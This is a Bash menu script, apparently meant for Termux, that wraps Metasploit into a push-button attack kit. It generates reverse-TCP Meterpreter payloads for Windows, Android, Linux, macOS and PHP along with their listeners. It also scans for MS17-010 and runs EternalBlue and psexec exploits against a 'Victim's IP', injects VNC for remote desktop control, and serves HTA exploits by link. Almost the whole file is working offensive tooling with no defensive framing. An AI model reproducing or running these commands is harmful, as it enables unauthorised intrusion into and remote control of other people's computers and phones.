i="0"
resize -s 27 80
clear
while [ $i -lt 1 ]
do
clear
ip=$(ip addr show wlan0 | awk '/inet / {print $2}' | cut -d/ -f 1)

 echo -e '\e[1;33m


  ▓█████▄ ▓█████  ██▀███  ███████ ▒█    ░█▌     ▓█████▄  ▓█████   ▓█████  ▓█████▄   ▓█████
▒▒██▀ ██▌▓█   ▀ ▓██ ▒ ██▒▒   ██    ▒█▒  █░    ▒░██▀  ██  ▓█   ▀   ▓█   ▀  ░██▀  ██  ▓█   ▀
▒░██   █▌▒███   ▓██ ░▄█ ▒░  ▓██▄     █▄█ ▒    ▒▒██    ██ ▒███     ▒███    ▒██    ██ ▒██  
░▓█▄   ▌▒▓█  ▄ ▒██▀▀█▄    ▒ ▓██▒     ▓█         █▄    ▌  ▒▓█  ▄ ▒ ▒▓█  ▄   █▄    ▌  ▒▓█  ▄
▒░▒████▓ ░▒████▒░██▓ ▒██▒▒  ▒██▒▒   ▒█▄        ▒░▒███▓▓  ░▒████▒  ░▒████▒  ░▒███▓▓   ▒████ 
▒▓ ░▒▓░ ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░▒   ▒▓▒  ▒ ░    ▒▒    ▒▒▓  ▒ ░░ ▒▒▓  ▒ ░░  ▒ ▒ ▒▒▓     ░░ ▒
░▒ ░ ▒░ ░ ▒  ▒  ░ ░  ░  ░▒ ░ ▒░░   ░▒  ░ ░      ░ ▒  ▒  ░  ▒  ▒  ░         ░ ▒  ▒  ░  ░ ▒  ▒
░░   ░  ░ ░  ░    ░     ░░   ░ ░  ░  ░           ░ ░  ░     ░ ░  ░     ░ ░  ░     ░ ░  ░  
░        ░       ░  ░   ░           ░                                 ░      
         ░
                       
▓█████▄    ▓█████▄   ██▄    █▄    ▓█████            ▓█████▄  ██    █   ██▀███    ███████
▒▒██▀ ██▌  ▒▒██▀ ██▌ ▄█ █  █▄    ▓█   ▀          ▒░██▀  ██  ▄█    ▄█  ▓██ ▒ ██▒▒    ██
▒░██   █▌  ░██   █   █▌▒ █ █▌    ▒███            ▒▒██    ██  █▌▒  █   ▓██ ░▄█      ▓██▄
░▓█▄   ▌▒  ▒░██   █   ▌   █ ▌    ▒▓█  ▄ ▒          █▄    ▌   ██    █▄ ▒██▀▀█▄      ▓██▒
░▒████▓     ▒████▓  ░█▌    ▓█▌    ░▒████▒         ▒░▒███▓▓  ░▒██▄▄██ ▒░██▓ ▒██▒▒   ▒██▒▒
▒▓ ░▒▓░ ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░▒   ▒▓▒  ▒ ░    ▒▒    ▒▒▓       ░ ░  ░     ░ ░  ░    ░▒▓░▒
  ▒▓ ░▒▓░ ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░▒   ▒▓▒  ▒ ░    ▒▒    ▒▒▓       ░ ░  ░     ░ ░  ░    ░▒▓░▒                      



▓█████	 ██         ▓█████        █     ███▄█
▓█   ▀	▒██▓▄██	    ▓█   ▀      ██ █    ██   █
▒██      ███  ██▄    ███       █   ▓█   ██▄▄█
▒▓█  ▄	▒██    █▓▄  ▒▓█  ▄ ▒  ██▄▄▄██   ██
 ▒████	░██     ██  ░▒████  ▄██░   ▒ ██ ██
▒▓ ░▒▓░ ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░▒   ▒▓▒  ▒ ░
  ▓  ▒ ░░ ▒  ░▒▓░▒   ░ ░░ ▒▓ ░▒▓░▒   ▒▓▒  ▒



\e[1;34m
                                
(1) Windows --> test.exe (payload and listener) 
(2) Android --> test.apk (payload and listener)  
(3) Linux --> test.py (payload and listener) 
(4) MacOS --> test.jar (payload and listener)
(5) Web --> test.php (payload and listener)
(6) Scan if a target is vulnerable to ms17_010
(7) Exploit Windows 7/2008 x64 ONLY by IP (ms17_010_eternalblue)
(7rd) Enable Remote Desktop (ms17_010_eternalblue)
(8) Exploit Windows Vista/XP/2000/2003 ONLY by IP (ms17_010_psexec) 
(8rd) Enable Remote Desktop (ms17_010_psexec)
(9) Exploit Windows with a link (HTA Server)
'
pkg install postgresql
service postgresql start

exe='1'
apk='2'
py='3'
jar='4' 
php='5'
scan='6'
eternalblue='7'
eternalbluerd='7rd'
psexec='8'
psexecrd='8rd'
hta='9'



read x


if [ "$x" == "$exe" ]; then                    #EXE
msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 -f exe > d4c.exe
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: d4c.exe!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"


elif [ "$x" == "$apk" ]; then                          #APK
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=4444 > d4c.apk
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: d4c.apk!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"




elif [ "$x" == "$py" ]; then                       #PYTHON
msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=4444 > d4c.py
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: d4c.py!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"



elif [ "$x" == "$jar" ]; then                        #JAVA
msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f jar > d4c.jar
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: d4c.jar!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"






elif [ "$x" == "$php" ]; then                        #PHP
msfvenom -p php/meterpreter/reverse_tcp lhost=$ip lport=4444 > d4c.php
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: d4c.php!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload php/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"




elif [ "$x" == "$scan" ]; then                        #SCAN
echo "Victim's IP:"
read r

msfconsole -q -x " use auxiliary/scanner/smb/smb_ms17_010; set rhosts $r ; exploit ;exit ;"
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read


elif [ "$x" == "$eternalblue" ]; then                        #ETERNALBLUE
echo "Victim's IP:"
read r

msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp;  set lhost $ip ; set rhost $r ; exploit ; "



elif [ "$x" == "$eternalbluerd" ]; then                        #ETERNALBLUERD
echo "Victim's IP:"
read r

msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/vncinject/reverse_tcp;  set lhost $ip ; set rhost $r ; set viewonly false ; exploit ; "




elif [ "$x" == "$psexec" ]; then                        #PSEXEC
echo "Victim's IP:" 
read r

msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set lhost $ip ; set rhost $r ; exploit ;"


elif [ "$x" == "$psexecrd" ]; then                        #PSEXECRD
echo "Victim's IP:"
read r

msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set payload windows/vncinject/reverse_tcp;  set lhost $ip ; set rhost $r ; set viewonly false ; exploit ; "



elif [ "$x" == "$hta" ]; then                        #HTA
echo 'Uripath: (/)'
read u
msfconsole -q -x " use exploit/windows/misc/hta_server; set srvhost $ip; set uripath /$u; set payload windows/meterpreter/reverse_tcp; set lhost $ip ; exploit ;"



clear

read


else 

n


fi

done
